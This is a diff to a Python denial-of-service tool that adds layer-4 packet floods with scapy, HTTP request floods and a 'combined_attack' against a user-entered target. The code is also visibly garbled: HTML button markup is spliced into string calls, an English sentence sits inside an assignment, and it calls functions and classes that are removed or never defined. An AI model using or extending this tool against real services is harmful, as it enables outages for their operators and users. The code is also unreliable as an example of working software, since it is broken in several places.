@@ -8,17 +8,16 @@ from threading import Thread
 import socket
 import random
 from scapy.all import *
+from plac import place
 from python_sniffer.sniffer import Printer
 
-# Define exceptions
 class FloodException(Exception):
     """Base class for other exceptions."""
     pass
 
-
 class Flood:
     def __init__(self, target, no_of_packets, file_out, prn,
-                 end, payload Tablets ,port, payload=False):
+                 end, payload, payload_file, port, payload_size):
         self.target = target
         self.no_of_packets = no_of_packets
         self.file_out = file_out
@@ -26,6 +25,7 @@ class Flood:
         self.end = end
         self.payload = payload
         self.port = port
+        self.payload_size = payload_size
 
     def get_data(self):
         try:
@@ -35,7 +35,7 @@ class Flood:
             data = s.recv(1024)
             return data
         except socket.error as msg:
-            self.prn("Error Code: " + str(msg
+            print("Error Code: " + str(msg
   <button className="select-none no-underline">
   <a className="" href="" target="_blank">
         <span className="relative -top-[0rem] inline-flex">
@@ -45,7 +45,7 @@ class Flood:
         </span>
       </a>
     </button>) +
-                     " -" + str(msg
+                  " -" + str(msg
   <button className="select-none no-underline">
   <a className="" href="" target="_blank">
         <span className="relative -top-[0rem] inline-flex">
@@ -55,7 +55,7 @@ class Flood:
         </span>
       </a>
     </button>)
-                     " - On the target " + self.target)
+                  " - On the target " + self.target)
             sys.exit(1)
         except FloodException as e:
             print("Error:", e)
@@ -120,7 +120,6 @@ class Flood:
             sys.exit(1)
         print("Payload/Attack has stopped")
 
-# get the input
 def get_user_input():
     try:
         target = input("Enter the target URL (including http(s)://): ")
@@ -133,29 +132,53 @@ def get_user_input():
             payload = True
             payload_file = input("Enter the path to the payload file: ")
             payload_size = int(input("Enter the size of the payload: "))
-            return target, bot_amount, attack_time, threads, port, payload, payload_file, \
-                   payload_size
+            return target, bot_amount, attack_time, threads, port, payload, \
+                   payload_file, payload_size
         else:
             payload = False
-            return target, bot_amount, attack_time, threads, port, payload
+            return target, bot_amount, attack_time, \
+                   threads, port, payload
     except Exception as e:
         print("Error:", e)
         sys.exit(1)
 
-def advanced_flood_attack():
-    target, bot_amount, attack_time, threads, port, payload, \
-    payload_file, payload_size = get_user_input()
+def hulk_layer_4_attack(target, bot_amount, attack_time, threads, port):
+    ip_range = scapy.utils.iprange_to_CIDR(target)
+    target = scapy.utils IP being attacked is an IP address, not a URL.
+    
+    ip_layer = IP(dst=target)
 
-    if not payload:
-        fl = Flood(target, bot_amount, "", False, 0, payload, port)
-    else:
-        fl = Flood(target, bot_amount, payload_file, True, payload_size, payload, port,
-                   fl.fuzzer_end)
+    # Add your code here
+    for _ in range(bot_amount):
+        tcp_layer = TCP()
+        data = 'Lorem Ipsum'  # Add payload (optional)
 
-    fl.send_data()
+        sendp(ip_layer / tcp_layer / data, inter=0.0001, loop=attack_time, verbose=False)
+
+def crash_layer_7_attack():
+    target, bot_amount, attack_time, threads, port, payload = get_user_input()
+    return CrashAttack(target).start(bot_amount, attack_time)
+
+def httpflood_layer_7_attack():
+    target, bot_amount, attack_time, threads, port, payload = get_user_input()
+    for i in range(bot_amount):
+        try:
+            while attack_time > 0:
+                requests.get(target)
+                attack_time -= 0.001
+        except:
+            pass
+    print(f"\nTotal requests: {bot_amount}")
+
+def combined_attack():
+    target, bot_amount, attack_time, threads, port, payload, payload_file, payload_size = get_user_input()
+    hulk_layer_4_attack(target, bot_amount, attack_time, threads, port)
+    advanced_flood_attack()
+    crash_layer_7_attack()
+    httpflood_layer_7_attack()
 
 def main():
-    advance_flood = advanced_flood_attack()
+    combined_attack()
     sys.exit(0)
 
 if __name__ == '__main__':
